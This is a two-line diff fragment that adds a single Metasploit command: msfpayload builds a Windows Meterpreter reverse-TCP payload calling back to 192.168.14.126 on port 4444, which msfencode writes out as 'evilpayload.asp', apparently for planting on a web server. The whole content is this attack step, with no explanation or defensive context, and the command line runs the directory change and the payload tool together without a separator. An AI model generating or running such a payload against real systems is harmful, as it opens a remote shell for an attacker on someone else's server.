@@ -1,0 +1,2 @@
+cd /usr/share/framework2/ ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.14.126 LPORT=4444 R | /usr/share/framework2/msfencode -o evilpayload.asp
+
